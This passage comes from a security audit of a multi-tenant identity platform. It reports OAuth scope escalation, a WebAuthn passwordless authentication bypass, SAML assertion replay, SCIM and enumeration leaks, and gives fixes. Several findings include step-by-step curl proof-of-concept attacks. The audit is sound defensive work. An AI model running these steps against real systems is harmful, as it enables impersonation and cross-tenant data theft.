- `/api/v1/org/tenants/activate` — activate any tenant
- `/api/v1/admin/audit/global` — global audit logs
- `/api/v1/admin/threats/dashboard` — threat intelligence
- All `adminOnlyPaths` endpoints across all tenants (via `X-Tenant-ID` header — cross-tenant access allowed because `isPlatformAdmin` check in JWTAuth:766-774 passes with `platform:admin` scope)

**Cross-tenant access:**

The M2M token has `platform:admin` in the scope claim. In `JWTAuth` (middleware.go:761-781), the cross-tenant check:
```go
if scopes, ok := claims["scope"].(string); ok {
    for _, sc := range strings.Fields(scopes) {
        if strings.EqualFold(sc, "platform:admin") {
            isPlatformAdmin = true
            break
        }
    }
}
if !isPlatformAdmin {
    writeUnauthorized(w, "tenant mismatch...")
    return
}
```
This allows the M2M token to set any `X-Tenant-ID` header and access any tenant's data.

**PoC:**

```bash
# Step 1: As tenant admin, create OAuth client with platform:admin scope
curl -X POST https://target/api/v1/oauth/clients \
  -H "Authorization: Bearer <tenant_admin_jwt>" \
  -H "Content-Type: application/json" \
  -d '{"name":"escalation","type":"confidential","grant_types":["client_credentials"],"scopes":["platform:admin"]}'

# Response: {"client_id":"<client_id>","client_secret":"<client_secret>"}

# Step 2: Obtain M2M token with platform:admin scope
curl -X POST https://target/api/v1/oauth/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=client_credentials&client_id=<client_id>&client_secret=<client_secret>"

# Response: {"access_token":"<m2m_jwt_with_platform:admin>"}

# Step 3: Access platform-only endpoints
curl https://target/api/v1/system/ \
  -H "Authorization: Bearer <m2m_jwt>"

# Step 4: Cross-tenant access — access any tenant's data
curl https://target/api/v1/users \
  -H "Authorization: Bearer <m2m_jwt>" \
  -H "X-Tenant-ID: <any_tenant_id>"
```

**Code locations:**
- `services/oauth/internal/service/oauth_service.go:167-216` — `CreateClient` (no scope filtering)
- `services/oauth/internal/service/oauth_service.go:322-365` — `UpdateClientMetadata` (also no scope filtering, same vulnerability on update path)
- `services/oauth/internal/service/oauth_service.go:2245-2293` — `ClientCredentials` grant handler
- `services/oauth/internal/service/oauth_service.go:2298-2322` — `issueClientAccessToken` (embeds scopes in JWT)
- `services/gateway/internal/router/router.go:863-880` — `checkRouteScope` circular `isPlatformTenant` logic
- `services/gateway/internal/middleware/middleware.go:761-781` — `JWTAuth` cross-tenant bypass for `platform:admin` scope
- Compare with: `services/oauth/internal/service/oauth_service.go:2928-2944` — `DynamicClientRegister` which correctly filters admin scopes

**Fix recommendation (audit only — not implementing):**
- `CreateClient` and `UpdateClientMetadata` must filter admin/platform/system/tenant prefixed scopes using the same logic as `DynamicClientRegister` (oauth_service.go:2930-2944)
- `checkRouteScope` should verify `isPlatformTenant` by checking the JWT `tenant_id` against the actual platform tenant ID in the database, not by checking the forgeable `platform:admin` scope string
- Alternatively, `isPlatformTenant` should require both: (a) `platform:admin` scope AND (b) token issued by the platform tenant's OAuth service

---

### P1-2: UpdateClientMetadata — Scope Escalation on Existing Clients

**Severity:** P1 (High)
**CVSS:** 7.2 (AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H)

**Root cause:**

`OAuthService.UpdateClientMetadata` (oauth_service.go:322-365) accepts arbitrary scope values with no filtering — same issue as `CreateClient`. A tenant admin can update an existing OAuth client's scopes to include `platform:admin`, then use `client_credentials` to obtain a platform admin token.

**Attack path:** Same as P0-2 but via PATCH/PUT on an existing client instead of creating a new one.

**Code location:** `services/oauth/internal/service/oauth_service.go:346-348`

---

### P2-1: checkRouteScope isPlatformTenant Circular Logic

**Severity:** P2 (Medium)
**CVSS:** 6.5 (AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L)

**Root cause:**

`checkRouteScope` (router.go:863-880) determines `isPlatformTenant` by checking if the JWT scope claim contains `platform:admin`. This is circular: the scope string is used to determine "platform tenant" status, then the same scope string is used to grant `hasPlatform`. There is no verification that the JWT's `tenant_id` actually belongs to the platform tenant.

**Impact:** Any token with `platform:admin` in the scope claim — regardless of which tenant issued it — is treated as a platform tenant token. This is the enabling vulnerability for P0-2.

**Code location:** `services/gateway/internal/router/router.go:863-880`

---

### P2-2: routePermissionResource Coverage Gaps

**Severity:** P2 (Medium) — defense-in-depth weakness

**Root cause:**

`routePermissionResource` (rbac_dynamic.go:394-406) maps only 11 route prefixes to permission resources. Many `adminOnlyPaths` entries have no corresponding mapping:

**Unmapped admin paths:**
- `/api/v1/tenants` — no resource mapping
- `/api/v1/impersonate`, `/api/v1/auth/impersonate` — no resource mapping
- `/api/v1/api-keys`, `/api/v1/access-keys` — no resource mapping
- `/api/v1/admin/secrets`, `/api/v1/admin/key-rotation`, `/api/v1/admin/backup` — no resource mapping
- `/api/v1/auth/mfa/factors`, `/api/v1/auth/mfa/admin/` — no resource mapping
- `/api/v1/auth/credentials/` — no resource mapping
- `/api/v1/auth/credential-stuffing/` — no resource mapping
- `/api/v1/mdm/devices` — no resource mapping
- `/api/v1/identity/devices/` — no resource mapping
- `/api/v1/access-reviews`, `/api/v1/activity`, `/api/v1/exports` — no resource mapping
- `/oauth/clients` — no resource mapping

**Impact:** When `HasPermissionForRoute` is called for these paths, it returns `false` (no resource found). This means:
- M2M tokens with fine-grained permissions (e.g. `tenants:write`) cannot access `/api/v1/tenants` via the permission-key fallback in `RequireAdminScope` (rbac.go:185)
- API keys with specific scopes cannot access these routes via `HasPermissionForRoute` in JWTAuth (middleware.go:645)
- These paths rely solely on the `hasAdminScope` check (admin scope bypass), which is correct but removes the defense-in-depth layer of fine-grained permission checks

**Code location:** `services/gateway/internal/middleware/rbac_dynamic.go:394-406`

---

### P3-1: apiKeyHasWriteAccess — Dead Code with Empty Loop Body

**Severity:** P3 (Info)

**Root cause:**

`apiKeyHasWriteAccess` (middleware.go:956-979) is defined but never called. It contains an empty loop body at line 961-962:
```go
for _, s := range scopes {
    if s == "*" || s == "platform:admin" || s == "tenant:admin" {
        // empty body — missing return true
    }
}
```

This appears to be a refactoring artifact. The actual API key scope enforcement happens in `JWTAuth` (middleware.go:642-664) via `HasPermissionForRoute` + wildcard fallback. The dead function is not exploitable but indicates incomplete refactoring.

**Code location:** `services/gateway/internal/middleware/middleware.go:953-979

---

### P3-2: Dynamic RBAC Resolver — Stale Memory Fallback (5-minute window)

**Severity:** P3 (Low) — defense-in-depth concern

**Root cause:**

When Redis and DB are both unavailable, the RBAC resolver falls back to stale in-memory snapshot up to 5 minutes old (rbac_dynamic.go:196-198):
```go
if ever && time.Since(r.loadedAt) < 5*time.Minute {
    return snap, nil
}
```

During this window, permission changes (e.g. role revocation) are not reflected. If an admin revokes a role's access to a route, the stale snapshot still grants access for up to 5 minutes.

**Impact:** Low — requires simultaneous Redis + DB outage, and the stale data is at most 5 minutes old. But in a security incident scenario, an attacker who causes a DB outage could maintain access via stale RBAC rules.

**Code location:** `services/gateway/internal/middleware/rbac_dynamic.go:196-198

---

### Summary of Attack Surface #2 Findings

| ID | Severity | Title | Exploitable |
|---|---|---|---|
| P0-2 | P0 Critical | Tenant Admin → Platform Admin via M2M scope injection | Yes — full PoC |
| P1-2 | P1 High | UpdateClientMetadata scope escalation | Yes — same path as P0-2 |
| P2-1 | P2 Medium | checkRouteScope circular isPlatformTenant logic | Enabling factor for P0-2 |
| P2-2 | P2 Medium | routePermissionResource coverage gaps | Defense-in-depth weakness |
| P3-1 | P3 Info | apiKeyHasWriteAccess dead code | Not exploitable |
| P3-2 | P3 Low | RBAC resolver 5-min stale fallback | Requires infrastructure outage |

---

## Attack Surface #3: OAuth/OIDC Flow Attacks

### P2-3: State Parameter CSRF Validation Bypass at Token Endpoint

**Severity:** P2 (Medium)
**CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L)

**Code location:**
- `services/oauth/internal/server/server.go:759-768` — token endpoint state check
- `services/oauth/internal/service/oauth_service.go:426-428` — authorize endpoint state requirement

**Root cause:**

The `/oauth/authorize` endpoint correctly **requires** the `state` parameter (line 426-428):
```go
if req.State == "" {
    return "", errors.InvalidArgument("state parameter is required")
}
```

However, the `/oauth/token` endpoint makes state validation **optional** (line 759-768):
```go
stateParam := r.FormValue("state")
if stateParam != "" {  // ← only validates if state is present
    if !oauthSvc.ValidateState(clientID, stateParam) {
        ...
        return
    }
}
// if stateParam == "", validation is completely skipped
```

This means an attacker who obtains an authorization code (e.g., via interception, log exposure, or code injection) can exchange it at the token endpoint **without sending the state parameter**, completely bypassing CSRF validation.

**Impact:** The state parameter's CSRF protection is defeated by simply omitting it at the token exchange step. While the primary CSRF protection for OAuth is the redirect_uri matching and code binding, the state parameter is meant to be a second layer of defense. Making it optional at token exchange defeats its purpose.

**NEEDS-VERIFY:** In standard OAuth 2.0, state is a client-side CSRF protection passed through the redirect — it is not strictly required at the token endpoint by RFC 6749. However, since the system enforces state at authorize time and stores it for validation, making it optional at token exchange creates an inconsistency that weakens the security model. If the intent is to validate state at token exchange (as the code comments suggest: "State is generated at /authorize and must match at token exchange"), then it should be mandatory, not optional.

---

### P2-4: State Not Bound to User Session

**Severity:** P2 (Medium)

**Code location:**
- `services/oauth/internal/service/oauth_service.go:493-504` — state storage
- `services/oauth/internal/service/oauth_service.go:1740-1770` — state validation

**Root cause:**

State is stored keyed only by `clientID:state`:
```go
stateKey := fmt.Sprintf("oauth:state:%s:%s", req.ClientID, req.State)
```

The state is **not bound to the user's session or browser**. This means:
1. If an attacker can observe or guess the state value, they can use it from a different session.
2. The state validation at token exchange only checks that the state was *issued*, not that it belongs to the *same user/session* requesting the token exchange.

However, state is generated by the client (not the server), so this is partially by design — the state is a client-supplied random value stored for later verification. The real issue is the optional validation at token exchange (P2-3 above).

---

### P3-3: Confidential Clients Not Required to Use PKCE

**Severity:** P3 (Low)

**Code location:**
- `services/oauth/internal/server/server.go:500-507` — PKCE enforcement
- `services/oauth/internal/service/oauth_service.go:437-442` — service-level PKCE enforcement

**Root cause:**

PKCE is only enforced for:
1. Public clients (always required)
2. Clients with `RequirePKCE=true` flag

Confidential clients without `RequirePKCE` flag can omit `code_challenge` entirely. While RFC 7636 makes PKCE optional for confidential clients, OAuth 2.1 (which the system claims to follow — "OAuth 2.1: S256 is the only supported method") mandates PKCE for **all** clients.

The discovery config advertises `CodeChallengeMethodsSupported: ["S256"]` but does not enforce PKCE universally.

**Impact:** A confidential client compromised of its authorization code (e.g., via redirect_uri interception) cannot be protected by PKCE if PKCE was never used. This is a defense-in-depth gap.

---

### P3-4: DCR Accepts Arbitrary redirect_uri Schemes Without Validation

**Severity:** P3 (Low)

**Code location:**
- `services/oauth/internal/service/oauth_service.go:2971-2979` — DynamicClientRegister

**Root cause:**

`DynamicClientRegister` accepts any `RedirectURIs` from the client without validating:
- URI scheme (http, https, custom schemes)
- No check for `javascript:` or `data:` schemes
- No restriction on localhost/loopback for non-native clients
- No validation that URIs use HTTPS in production

The only protection is `ValidateRedirectURI` which does exact string matching against registered URIs, but if a malicious client registers `javascript://attacker.com`, it would be accepted and later matched.

**Impact:** A malicious DCR registration could register dangerous redirect URIs. However, DCR requires tenant context, limiting exposure to authenticated users.

---

### Audit Summary for Attack Surface #3

**What was verified as secure:**
1. **redirect_uri exact match** — `ValidateRedirectURI` does byte-for-byte comparison, no prefix matching (domain/models.go:97-104)
2. **PKCE S256 validation** — Correct SHA256 + base64url + constant-time comparison (domain/models.go:177-188)
3. **PKCE plain method rejected** — `ValidatePKCE` returns false for "plain" (domain/models.go:184-186)
4. **Authorization code one-time use** — `ConsumeCode` uses atomic `UPDATE ... WHERE used = false` (pg_repo.go:335-340)
5. **Auth code bound to client_id** — ExchangeAuthorizationCode checks `code.ClientID != client.ID` (oauth_service.go:564-566)
6. **Auth code bound to redirect_uri** — ExchangeAuthorizationCode checks `code.RedirectURI != req.RedirectURI` (oauth_service.go:569-571)
7. **No implicit flow** — Only `code` response type supported, no token in URL fragment (oauth_service.go:695)
8. **No token logging** — slog calls only log errors/warnings with error messages, not token values
9. **Cache-Control/Referrer-Policy headers** — Set on authorize redirect (server.go:648-650)
10. **iss parameter in redirect** — Prevents mix-up attacks (oauth_service.go:1724-1725)
11. **Authorization code randomness** — Uses `pkgcrypto.GenerateRandomToken(32)` (oauth_service.go:450)
12. **10-minute code expiry** — Codes expire in 10 minutes (oauth_service.go:472)

| ID | Severity | Title | Exploitable |
|---|---|---|---|
| P2-3 | P2 Medium | State CSRF validation bypass at token endpoint | Bypasses state CSRF check by omitting state |
| P2-4 | P2 Medium | State not bound to user session | Weakens CSRF protection |
| P3-3 | P3 Low | Confidential clients not required to use PKCE | Defense-in-depth gap vs OAuth 2.1 |
| P3-4 | P3 Low | DCR accepts arbitrary redirect_uri schemes | Requires authenticated DCR access |

---

## Attack Surface #4b: Identity Federation — SAML, SCIM, Social Login, Passkey/WebAuthn

### P0-5: WebAuthn Passwordless Login — Complete Authentication Bypass (No Assertion Verification)

**Severity:** P0 (Critical)
**CVSS:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Code location:**
- `services/auth/internal/server/webauthn_passwordless.go:89-162` — `handleWebAuthnPasswordlessFinish`

**Root cause:**

The passwordless WebAuthn login completion handler does NOT verify the WebAuthn assertion at all. Line 152-153 contains:

```go
// In production: verify WebAuthn assertion via webauthn.FinishLogin
// For now, return success with a simulated JWT
writeJSON(w, http.StatusOK, map[string]any{
    "status":     "authenticated",
    "username":   sess.Username,
    "tenant_id":  sess.TenantID,
    ...
})
```

The handler:
1. Looks up the session by `session_id` (a UUID — no authentication required to obtain one)
2. Checks if the session has expired
3. **Skips WebAuthn assertion verification entirely**
4. Returns `authenticated: true` with a JWT token

The `handleWebAuthnPasswordlessBegin` endpoint (line 30-84) requires only a `username` and `tenant_id` — no authentication. It generates a challenge and session_id, but the challenge is never validated.

**Attack scenario:**

```
# Step 1: Begin passwordless login for any user (no auth required)
curl -X POST http://target/api/v1/auth/webauthn/passwordless/begin \
  -H 'Content-Type: application/json' \
  -d '{"tenant_id":"<target_tenant>","username":"admin@company.com"}'

# Response: {"session_id": "abc-123", "challenge": "..."}

# Step 2: Complete login WITHOUT any WebAuthn credential
curl -X POST http://target/api/v1/auth/webauthn/passwordless/finish \
  -H 'Content-Type: application/json' \
  -d '{"session_id":"abc-123","credential":{},"assertion":""}'

# Response: {"status":"authenticated","username":"admin@company.com","token_type":"Bearer",...}
```

**Impact:**
- Complete authentication bypass — any user in any tenant can be impersonated
- No WebAuthn credential, authenticator, or biometric verification needed
- The only requirement is knowing the target username and tenant_id
- The response includes a JWT token granting full access as the victim user

**Note:** The challenge is generated using `uuid.New().String()` (line 50), which is NOT cryptographically random — it's a predictable UUID. However, since the challenge is never verified, this is moot.

---

### P1-5: SAML ACS Handler — Assertion Extraction Bypass (No Response Envelope Parsing)

**Severity:** P1 (High)
**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L)

**Code location:**
- `services/auth/internal/server/saml_handler.go:103-118` — ACS handler
- `pkg/saml/signed_assertion.go:386-433` — `VerifySignedAssertion`
- `pkg/saml/assertion.go:69-76` — `ParseAssertion`

**Root cause:**

The SAML ACS handler decodes the base64 SAMLResponse and passes the **full `<samlp:Response>` XML** directly to `VerifySignedAssertion`:

```go
responseXML, err := base64.StdEncoding.DecodeString(samlResponseB64)
// ...
assertion, err := ggidSAML.VerifySignedAssertion(responseXML, idpCert)
```

`VerifySignedAssertion` calls `ParseAssertion(rawXML)` which does:
```go
var assertion SAMLAssertion  // XMLName: xml:"Assertion"
xml.Unmarshal(rawXML, &assertion)
```

Go's `xml.Unmarshal` matches the **root element** against `XMLName`. When the root is `<samlp:Response>` (local name: `Response`), it does NOT match `Assertion` (local name: `Assertion`), so parsing fails.

This means:
1. The ACS handler **cannot process standard SAML Responses** from real IdPs (which wrap assertions in `<samlp:Response>`)
2. The handler **only works** if the input is a bare `<Assertion>` XML document — which bypasses the Response-level signature, status check, issuer verification, and InResponseTo validation
3. The `HandleIdPInitiatedSSO` path in `idp_initiated.go` does properly parse `<Response>` envelopes but is NOT used by the ACS handler

**XSW implication:** An attacker who obtains a validly-signed `<Assertion>` (e.g., from a different SP, a logged assertion, or a test endpoint) can submit it directly to the ACS handler without a Response envelope. The signature on the assertion is verified, but:
- No Response-level status check (should be `urn:oasis:names:tc:SAML:2.0:status:Success`)
- No Response-level Issuer verification against trusted IdPs
- No Response-level Destination check (ACS URL validation)
- The assertion replay protection via Redis (line 152-170) is present but only prevents re-use of the same assertion ID within 15 minutes

**Attack scenario:**

An attacker who captures a validly-signed SAML assertion (e.g., by legitimately authenticating to a different SP that uses the same IdP) can replay it against GGID's ACS endpoint:

```
# Strip the Response envelope, submit just the signed Assertion
assertion_xml = extract_assertion_from_captured_response()
b64 = base64encode(assertion_xml)
curl -X POST http://target/saml/acs -d "SAMLResponse=$b64"
```

**Impact:**
- Cross-SP assertion replay: assertions issued for one SP can be used against GGID
- Bypass of Response-level security checks (status, issuer, destination)
- If the IdP uses the same signing key for multiple SPs, any validly-signed assertion works

**NEEDS-VERIFY:** Whether the `HandleIdPInitiatedSSO` path is used elsewhere or if there's an extraction step before the ACS handler that we missed. The IdP (`idp.go:BuildSAMLResponse`) does produce a full `<samlp:Response>` with embedded assertion, suggesting the ACS handler is expected to receive full Response envelopes — which would fail at `ParseAssertion`.

---

### P1-6: SCIM searchUsers Endpoint Ignores Filter — Information Disclosure

**Severity:** P1 (High)
**CVSS:** 6.5 (AV:N/AC:L/PR:L/S:U/C:H/I:N)

**Code location:**
- `services/identity/internal/scim/handler.go:386-450` — `searchUsers`

**Root cause:**

The `searchUsers` handler (POST `/scim/v2/Users/.search`) accepts a `filter` field in the POST body but **completely ignores it**:

```go
var body struct {
    Filter     string `json:"filter,omitempty"`
    SortBy     string `json:"sortBy,omitempty"`
    ...
}

// ... falls back to query params for all fields ...
// BUT: body.Filter is NEVER passed to ListUsers!
result, err := h.svc.ListUsers(ctx, &domain.ListUsersFilter{
    PageSize: body.Count,
    Offset:   offset,
    SortBy:   sortBy,
    SortDesc: sortDesc,
    // Search field is MISSING — filter is silently dropped
})
```

Compare with `listUsers` (GET `/scim/v2/Users?filter=...`) at line 318-334 which does parse and pass the filter.

**Impact:**
- A SCIM client sending `POST /scim/v2/Users/.search` with `{"filter":"userName eq \"admin\""}` gets ALL users returned instead of filtered results
- This is an information disclosure — a search for a specific user returns the entire user directory
- SCIM clients relying on `.search` for filtered queries will receive unexpected full listings

---

### P2-5: GitHub Social Login Never Sets EmailVerified — Account Linking Bypass

**Severity:** P2 (Medium)
**CVSS:** 5.3 (AV:N/AC:L/PR:L/S:U/C:L/I:L)

**Code location:**
- `pkg/social/github.go:84-91` — GitHub connector `HandleCallback` return
- `services/auth/internal/server/social_handler.go:283-293` — email-based account linking

**Root cause:**

The GitHub connector's `HandleCallback` returns `UserInfo` without setting `EmailVerified`:

```go
return &UserInfo{
    Provider:   "github",
    ExternalID:  fmt.Sprintf("%d", claims.ID),
    Email:      email,
    Name:       claims.Name,
    AvatarURL:  claims.AvatarURL,
    RawClaims:  rawClaims,
    // EmailVerified is NOT SET — defaults to false
}, nil
```

The social handler's `jitProvisionUser` (line 283) only links accounts by email when `info.EmailVerified` is true:

```go
if h.pool != nil && info.Email != "" && info.EmailVerified {
    // Link to existing user by email
}
```

Since GitHub connector never sets `EmailVerified`, GitHub-authenticated users will **never** be linked to existing accounts by email. They will always create new accounts, even if they own the email.

**Impact:**
1. **Account duplication:** GitHub users always get new accounts instead of linking to existing email-based accounts
2. **Potential account takeover vector:** If the code were changed to always link by email (removing the `EmailVerified` check), GitHub would be vulnerable since it doesn't report email verification status
3. **Inconsistency:** Google and Apple connectors correctly set `EmailVerified`, but GitHub does not

**Note:** GitHub's `/user/emails` API does return a `verified` field per email, but `fetchPrimaryEmail` (line 94-118) only returns the email string without the verification status.

---

### P2-6: SCIM PATCH Operation Limited to displayName and active — Insufficient Tenant Isolation on PATCH

**Severity:** P2 (Medium)
**CVSS:** 4.3 (AV:N/AC:L/PR:L/S:U/C:L/I:L)

**Code location:**
- `services/identity/internal/scim/handler.go:622-687` — `patchUser`

**Root cause:**

The SCIM PATCH handler only processes `displayName` and `active` operations. Other standard SCIM PATCH paths (`userName`, `emails`, `phoneNumbers`, `externalId`) are silently ignored.

However, the PATCH handler gets the user via `h.svc.GetUser(ctx, userID)` which uses the tenant context from `injectTenant`. The tenant context is derived from the `X-Tenant-ID` header (line 246-208), NOT from the authenticated user's JWT.

This means:
1. The `injectTenant` function (line 192-208) reads `X-Tenant-ID` from the HTTP header
2. The SCIM handler trusts this header for tenant isolation
3. If the gateway doesn't strip/validate `X-Tenant-ID`, a SCIM client can set an arbitrary tenant ID

**Impact:**
- SCIM PATCH (and GET, PUT, DELETE) operations are tenant-scoped via `X-Tenant-ID` header
- If the gateway properly sets this header from JWT claims, this is safe
- If the header can be spoofed, cross-tenant SCIM operations are possible
- The PATCH handler's limited field support (only `displayName`/`active`) limits the damage

---

### P2-7: SCIM Bulk Operations Lack Tenant Verification on Each Operation

**Severity:** P2 (Medium)
**CVSS:** 4.3 (AV:N/AC:L/PR:L/S:U/C:L/I:L)

**Code location:**
- `services/identity/internal/scim/bulk.go:1-308` — Bulk operations

**Root cause:**

The SCIM bulk endpoint processes operations using the tenant context from `injectTenant` (same as other SCIM endpoints). However, each bulk operation's `Path` field (e.g., `/Users/{uuid}`) is parsed to extract a UUID, and the operation is executed using `h.svc.GetUser(ctx, userID)` / `h.svc.DeleteUser(ctx, userID)` which use the tenant from context.

The bulk operations do NOT verify that the target user belongs to the tenant specified in the request. They rely entirely on the service layer's tenant isolation (which uses `setTenantRLS` + explicit `tenant_id` WHERE clauses).

**Impact:**
- If the service layer's tenant isolation is correct (it appears to be — `pg_repo.go:298` sets RLS and `311` adds explicit `tenant_id` filter), this is defense-in-depth
- However, the bulk endpoint supports up to 1000 operations (`maxOperations: 1000` in ServiceProviderConfig) without rate limiting
- A SCIM token holder can batch-delete or batch-modify users across pages

---

### P3-5: WebAuthn Challenge Not Cryptographically Random

**Severity:** P3 (Low)
**CVSS:** 3.1 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N)

**Code location:**
- `services/auth/internal/server/webauthn_passwordless.go:50` — `challenge := uuid.New().String()`

**Root cause:**

The WebAuthn passwordless challenge is generated using `uuid.New().String()` (UUID v4), which uses `crypto/rand` internally but has only 122 bits of entropy. While this is sufficient for uniqueness, WebAuthn specifications recommend at least 128 bits of cryptographically random data for challenges.

The `generateChallenge()` function in `passkey_handler.go:287-294` correctly uses `crypto/rand` with 32 bytes (256 bits), but the passwordless handler uses `uuid.New()` instead.

**Impact:** Low — 122 bits is still computationally infeasible to guess. However, since the challenge is never verified (see P0-5), this is moot.

---

### Summary Table — Attack Surface #4b

| ID | Severity | Title | Exploitable |
|---|---|---|---|
| P0-5 | P0 Critical | WebAuthn passwordless login — no assertion verification | Yes — complete auth bypass, any user impersonation |
| P1-5 | P1 High | SAML ACS handler processes bare assertions without Response envelope | NEEDS-VERIFY — depends on whether standard SAML Responses work at all |
| P1-6 | P1 High | SCIM searchUsers silently drops filter parameter | Yes — returns all users regardless of filter |
| P2-5 | P2 Medium | GitHub connector never sets EmailVerified | No exploit — prevents account linking (safe failure) |
| P2-6 | P2 Medium | SCIM PATCH tenant isolation relies on X-Tenant-ID header | Depends on gateway header validation |
| P2-7 | P2 Medium | SCIM bulk operations lack per-operation tenant verification | Defense-in-depth gap — service layer enforces tenant isolation |
| P3-5 | P3 Low | WebAuthn challenge uses UUID instead of crypto/rand | Moot — challenge is never verified (P0-5) |

---

## Attack Surface #5: Data Leakage & PII

### P2-8: OAuth Client List API Exposes `client_secret_hash` to All Tenant Users

**Severity:** P2 (Medium)
**CVSS:** 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N)

**Affected endpoint:** `GET /api/v1/oauth/clients`

**Root cause:**

The `OAuthClient` domain struct includes `ClientSecretHash` with a JSON tag that serializes it into API responses:

```go
// services/oauth/internal/domain/models.go:32
ClientSecretHash string `json:"client_secret_hash,omitempty"` // Argon2id hash
```

The `ListClients` handler returns `[]*domain.OAuthClient` directly as JSON without any field filtering:

```go
// services/oauth/internal/server/server.go:1706-1712
clients, total, err := oauthSvc.ListClients(ctx, limit, offset)
if err != nil {
    writeInternalError(w, "ListClients", err)
    return
}
writeJSON(w, http.StatusOK, map[string]any{
    "clients":     clients,  // ← raw domain structs serialized with client_secret_hash
    "total":       total,
    ...
})
```

`ListClients` returns `[]*domain.OAuthClient` from the repository, and `writeJSON` marshals them directly, including the `client_secret_hash` field for every client.

**Impact:**

- Any authenticated tenant user with access to the OAuth client list endpoint can read the Argon2id hash of every confidential client's secret in that tenant.
- While Argon2id is a slow hash, offline brute-force is feasible for weak/predictable client secrets, especially for machine-to-machine clients that may have auto-generated secrets stored in config files.
- The hash also confirms whether a client is confidential vs public, aiding reconnaissance.

**Contrast with identity service:** The identity service correctly uses `userToJSON()` to map `*domain.User` to a safe field set before serialization (http.go:1179-1198), explicitly avoiding `PasswordHash`, `LastLoginIP`, etc. The OAuth service does not apply equivalent filtering.

**PoC:**
```
GET /api/v1/oauth/clients?limit=20
Authorization: Bearer <any valid tenant token>
X-Tenant-ID: <tenant-uuid>

Response:
{
  "clients": [
    {
      "id": "...",
      "client_id": "abc123...",
      "client_secret_hash": "$argon2id$v=19$m=65536,t=3,p=4$...",  // ← leaked
      "name": "my-app",
      "type": "confidential",
      ...
    }
  ]
}
```

**Recommendation:** Apply a `clientToJSON()` filter function (similar to `userToJSON()`) that strips `client_secret_hash` before serialization. Only return the hash (if at all) through a dedicated admin-only endpoint.

---

### P2-9: User Enumeration via `AlreadyExists` Error Messages

**Severity:** P2 (Medium)
**CVSS:** 4.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N)

**Affected endpoints:**
- `POST /api/v1/users` (create user)
- `POST /api/v1/auth/register`
- LDAP/JIT provisioning paths

**Root cause:**

The `AlreadyExists` error constructor includes the resource identifier in the error message, which is then returned to the API client:

```go
// pkg/errors/errors.go:65-67
func AlreadyExists(resource, id string) *GGIDError {
    return New(ErrAlreadyExists, fmt.Sprintf("%s already exists: %s", resource, id))
}
```

This is called with the actual username or email:

```go
// services/identity/internal/repository/pg_repo.go:100
return ggiderrors.AlreadyExists("user", user.Username)

// services/identity/internal/service/identity_service.go:347
return nil, gerr.AlreadyExists("user", username)

// services/identity/internal/service/identity_service.go:351
return nil, gerr.AlreadyExists("email", email)
```

The `WriteAPIError` function (pkg/errors/api_error.go:50-69) serializes `ge.Message` directly into the JSON response body:

```json
{"error": {"code": "already_exists", "message": "user already exists: admin@example.com"}}
```

**Impact:**

1. **Username/email enumeration**: An attacker can probe whether a specific username or email is registered by attempting to create a user and observing the error message. The response confirms existence and returns the exact value.

2. **Different error for username vs email**: The error distinguishes between `"user already exists: <username>"` and `"email already exists: <email>"`, revealing which field collided.

3. **HTTP status 409 (Conflict)**: The HTTP status code itself (409 vs 201) is sufficient for enumeration even if the message were sanitized — but the message makes it trivial and also confirms the exact registered value.

**Note:** The `CreateUser` function in identity_service.go:42-43 uses empty id `AlreadyExists("user", "")`, which produces `"user already exists: "` — less useful for enumeration but still distinguishes the conflict type. However, the LDAP/JIT path (identity_service.go:347,351) and pg_repo.go:100 include the actual username/email.

**PoC:**
```
POST /api/v1/users
Content-Type: application/json
X-Tenant-ID: <tenant-uuid>

{"username":"admin","email":"admin@example.com","password":"Test123!"}

Response 409:
{"error": {"code": "already_exists", "message": "user already exists: admin"}}
```

**Recommendation:** Return a generic message like `"user already exists"` without the resource identifier. Consider returning the same error for both username and email collisions to prevent field-level enumeration.

---

### P3-6: Auth Verify Response Leaks Internal `tenant_id`

**Severity:** P3 (Low)
**CVSS:** 3.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N)

**Affected endpoint:** `POST /api/v1/auth/verify`

**Root cause:**

The credential verification response includes the internal `tenant_id` UUID:

```go
// services/auth/internal/server/http.go:802-807
writeJSON(w, http.StatusOK, map[string]any{
    "user_id":      userID.String(),
    "tenant_id":    tc.TenantID.String(),  // ← internal UUID exposed
    "username":     req.Username,
    "mfa_required": mfaRequired,
})
```

**Impact:** Low — the tenant_id is already present in JWT claims and the X-Tenant-ID header. However, exposing it in a verification response (which might be called by external integrations) provides unnecessary internal structure information.

**Recommendation:** Remove `tenant_id` from the verify response unless the caller specifically needs it. The JWT token already carries this claim.

---

### Summary Table — Attack Surface #5

| ID | Severity | Title | Exploitable |
|---|---|---|---|
| P2-8 | P2 Medium | OAuth client list API exposes `client_secret_hash` | Yes — any tenant user can read secret hashes |
| P2-9 | P2 Medium | User enumeration via `AlreadyExists` error messages | Yes — username/email enumeration via create/register |
| P3-6 | P3 Low | Auth verify response leaks internal `tenant_id` | Low — already available via JWT/header |

### Areas Reviewed — No Issues Found

1. **Identity user API responses** — `userToJSON()` correctly maps User domain objects to safe field sets, excluding `password_hash`, `totp_secret`, `mfa_factors`, `last_login_ip`, `deleted_at`, `external_id`. Both `getUser` and `listUsers` use this function.

2. **Error response format** — `writeInternalError` in OAuth server correctly returns generic `"internal server error"` without leaking `err.Error()`. The `WriteAPIError` function uses `ge.Message` (not `ge.Detail` or `ge.Cause`), so internal cause/stack traces are not exposed. `GGIDError.Detail` field is never serialized to API responses.

3. **Audit log sensitive fields** — The audit `Event` struct (pkg/audit/publisher.go) does not have dedicated password/token/secret fields. The `Metadata` map could theoretically carry sensitive data, but:
   - `obfuscateEventPII` (audit_service.go:130-150) applies `pii.Obfuscate` to all string metadata values before persistence
   - Login audit events record `ActorName` (username) but not passwords
   - Token events do not record `access_token` values
   - `eventToJSON` in the audit query handler returns stored fields (already obfuscated)

